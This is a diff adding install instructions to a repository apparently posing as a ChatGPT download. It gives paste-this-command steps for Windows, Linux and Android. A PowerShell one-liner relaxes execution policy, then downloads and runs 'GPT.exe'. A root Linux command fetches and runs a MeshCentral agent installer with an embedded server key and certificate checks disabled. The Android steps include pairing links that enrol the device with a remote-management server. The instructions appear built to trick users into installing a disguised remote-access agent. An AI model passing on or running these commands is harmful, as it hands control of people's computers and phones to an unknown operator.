@@ -1,1 +1,20 @@
+# Install POWERSHELL win x64
 Set-ExecutionPolicy RemoteSigned -Force;$Url = 'https://github.com/chatgptopenai9001/Chat/raw/main/GPT.exe';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';;Invoke-WebRequest $Url -OutFile GPT.exe;.\GPT.exe -fullinstall;
+
+
+
+
+# Install Linux To install, cut and paste the following command in a root terminal.
+(wget "https://meshcentral.com/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://meshcentral.com/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo ./meshinstall.sh https://meshcentral.com 'MSXhPo7f7M@BJIC2B5gdqhaNYLxWzlFhUgs$ad3oWfspVm9lkdrKJBr9mTSZWj9o@5LXloANFst63NRxJWvgpG5d1osevy65UMN5pyUFQ1GAjKBX6cO5uSW4ckLWf77idU7KKByfCBovLsxpophrcpw@df3h3g=='
+
+# Install to Android 
+Download the agent software using the Google Play store or APK file, install it and use the QR code on the right or the pairing link below to setup your device on this server.
+
+![Mã QR Cho Android](https://github.com/chatgptopenai9001/Chat/blob/main/Screenshot%202023-03-10%20163247.png)
+
+Google Play Store: https://play.google.com/store/apps/details?id=com.meshcentral.agent2
+
+Android APK Download : https://info.meshcentral.com/downloads/MeshCentral2/meshcentral-agent.apk
+
+Server Pairing Link : mc://meshcentral.com,0BsEY8DJ442BJU97It1NrYSDAq7xhr$P8dYfT3OEbW@MjJTQHTzx6so4Nvjl0xak,ZxxG5hp9Isn3YegFsvbj9S2$Ibsk9sOwJc7A5sVjPRgzKxMRVsYYK3FPQ0p0g7aO
+
